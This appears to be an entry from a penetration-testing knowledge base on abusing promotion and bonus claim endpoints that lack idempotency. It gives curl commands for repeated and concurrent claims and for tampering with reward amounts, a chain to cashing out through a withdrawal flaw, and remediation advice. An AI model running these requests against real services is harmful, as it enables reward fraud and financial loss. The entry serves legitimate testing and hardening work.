---
title: Unlimited promotion / bonus / rebate claims (missing idempotency)
cve: None (business logic)
severity: high
cvss: 7.9
product: Promotion and reward endpoints
versions: Any
ports: 80, 443
keywords: promotion, bonus, bonus funds, rebate, idempotency, concurrent claims, promotion abuse
entry: Repeated or concurrent claims through /api/promotion/receive
verified: false
sources: Compiled from public sources (business logic flaws; no CVE)
---

## Fingerprints

```
/api/promotion/receive     /api/bonus/claim
/api/activity/reward       /api/rebate/claim?date=
Claim records use a single table without a uniqueness constraint
```

## Prerequisites

- An account (multiple accounts may be registered for comparison, but use only accounts you own).

## PoC

```bash
# A. Claim the same promotion repeatedly
for i in 1 2 3; do curl -s -X POST https://target/api/promotion/receive \
  -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
  -d '{"promotionId":12}'; echo; done

# B. Concurrent claims (10 concurrent copies of the same request)
seq 10 | xargs -P 10 -I{} curl -s -o /dev/null -X POST https://target/api/promotion/receive \
  -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' -d '{"promotionId":12}'

# C. Parameter tampering (amount/tier)
curl -s -X POST https://target/api/promotion/receive \
  -d '{"promotionId":12,"amount":9999,"level":"vip9"}'
```

## Exploitation Steps

1. Record the pre-claim balance → make repeated/concurrent claims → inspect the number of balance increases and claim records.
2. Confirmation: the same promotion is claimed multiple times (multiple table records), or the balance increases cumulatively.
3. Parameter tampering: do `amount`/`level`/`vip` affect the reward amount (if so, the server trusts the client)?
4. Chain: bonus credited → place a bet → follow the withdrawal chain (`withdraw-approval-idor.md`) to check withdrawability.
5. Evidence: before/after balances + record counts; use only your own accounts.

## Remediation and Mitigation (Hardening)

- Idempotent claims: unique `(user_id, promotion_id)` index; use locks or `INSERT ... ON DUPLICATE` for concurrency.
- Calculate reward amounts and tiers server-side; do not accept client-supplied values.
- Promotion rules engine + risk controls (alerts for repeated claims from the same device/IP/card).

## References

- OWASP A04 Insecure Design; CWE-799 (Improper Control of Interaction Frequency).
